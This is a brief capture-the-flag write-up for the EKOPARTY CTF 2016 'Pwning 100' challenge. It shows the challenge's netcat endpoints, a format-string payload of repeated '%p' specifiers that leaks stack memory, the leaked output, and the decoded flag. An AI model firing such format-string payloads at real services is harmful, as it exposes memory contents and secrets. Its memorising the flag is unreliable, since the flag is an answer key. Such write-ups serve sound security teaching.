#EKOPARTY CTF 2016: Pwning 100

###My first service I
```
Blacky is taking his first steps at C programming for embedded systems, but he makes some mistakes. Retrieve the secret key for access.

nc 9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site 35000
Alternate server: 7e0a98bb084ec0937553472e7aafcf68ff96baf4.ctf.site 35000
```

##Solution
A format string exploitation.
Payload:
```
aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p
```
And we get:
```
Invalid key: aaaa (nil) 0xa (nil) (nil) (nil) 0xa (nil) 0x454b4f7b 0x4c614269 0x67426566 0x3072647d (nil) 0x61616161
```

So, this hex is the secret key (flag):
>454b4f7b4c614269674265663072647d

>EKO{LaBigBef0rd}

Flag:
>EKO{LaBigBef0rd}
